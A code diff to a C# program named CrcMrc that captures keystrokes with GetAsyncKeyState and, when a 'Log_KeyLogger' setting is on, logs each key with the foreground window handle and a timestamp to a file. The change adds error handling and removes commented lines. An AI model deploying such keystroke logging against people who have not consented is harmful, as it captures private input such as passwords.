@@ -62,18 +62,22 @@ namespace CrcMrc
                 {
                     int key = GetAsyncKeyState(i);
                     Int32 hwnd = 0;
-                    hwnd = GetForegroundWindow().ToInt32();
+                    try
+                    {
+                        hwnd = GetForegroundWindow().ToInt32();
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("error 7 " + ex.Message.ToString());
+                    }
 
                     if (key == 1 || key == -32767)
                     {
                         text = converter.ConvertToString(i);
                         if (CrcMrc.Properties.Settings.Default.Log_KeyLogger) {
                                 using (StreamWriter sw = File.AppendText(path))
-                                {
-                                    //if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
-                                        sw.WriteLine(hwnd.ToString().PadRight(15) + text.PadRight(20) + "@ " + DateTime.Now.ToString());
-                                    //Array.Resize(ref iHwnd, iHwnd.Length + 1);
-                                    //iHwnd.SetValue(hwnd, iHwnd.Length-1);
+                                {                                    
+                                    sw.WriteLine(hwnd.ToString().PadRight(15) + text.PadRight(20) + "@ " + DateTime.Now.ToString());                                    
                                 }
                             }
                         Array.Resize(ref iHwnd, iHwnd.Length + 1);
@@ -88,9 +92,16 @@ namespace CrcMrc
         {
             if (iHwnd.Length != 0) return;
             Int32 hwnd = 0;
-            hwnd = GetForegroundWindow().ToInt32();
-            Array.Resize(ref iHwndView, iHwndView.Length + 1);
-            iHwndView.SetValue(hwnd, iHwndView.Length - 1);
+            try
+            {
+                hwnd = GetForegroundWindow().ToInt32();
+                Array.Resize(ref iHwndView, iHwndView.Length + 1);
+                iHwndView.SetValue(hwnd, iHwndView.Length - 1);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("view error 6" + ex.Message.ToString());
+            }
         }
 
         public void ResetCounter()
